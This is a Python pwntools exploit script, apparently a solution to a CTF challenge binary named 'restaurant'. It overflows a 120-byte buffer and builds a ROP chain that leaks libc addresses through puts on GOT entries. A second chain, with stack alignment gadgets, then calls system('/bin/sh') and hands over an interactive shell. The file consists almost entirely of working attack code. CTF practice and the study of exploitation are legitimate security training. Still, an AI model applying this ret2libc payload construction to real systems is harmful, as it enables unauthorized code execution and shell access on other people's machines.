from pwn import *


# Allows you to switch between local/GDB/REMOTE from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify your GDB script here for debugging
gdbscript = '''
b *custom
'''.format(**locals())

# Set up pwntools for the correct architecture
exe = './restaurant'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'debug'


# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Start program
io = start()
# gdb.attach(io)
r = ROP(elf)
libc = elf.libc
libc.address=  0x00007ffff7dd6000

offset = 120
io.recvuntil(b">>")
io.sendline(b"3")
io.recvuntil(b"to eat:")

r.puts(elf.got.printf)
r.puts(elf.got.gets)
r.puts(elf.got.gets) # you have to have another call to align the stack to 16 bytes
r.main()


pprint(r.dump())
payload = flat({
    offset: r.chain()
})
io.sendline(payload)

printf_leak = u64(io.recvline().strip().ljust(8, b"\x00"))
# gets_leak = u64(io.recvline().strip().ljust(8, b"\x00"))
print(f"{hex(printf_leak) = }")
# print(f"{hex(gets_leak) = }")
# libc = ELF("/home/alphaq/Downloads/def-camp2023CTF/PWN/bistro/libc6_2.27-3ubuntu1.4_amd64.so")
# libc.address = printf_leak - libc.sym['printf']
rop = ROP(libc)
print(f"{hex(libc.address) = }")
io.recvuntil(b">>")
io.sendline(b"3")
io.recvuntil(b"to eat:")

# rop.system(next(libc.search(b"/bin/sh\x00")))
# pprint(rop.dump())
payload = flat({
    offset: [
        rop.rdi.address+1, # this seems rlly interesting, you have to make the stack 16 bytes alligned by doing a ret again
        rop.rdi.address,
        next(libc.search(b'/bin/sh\x00')),
        libc.sym.system
    ]
})
io.sendline(payload)
io.interactive()

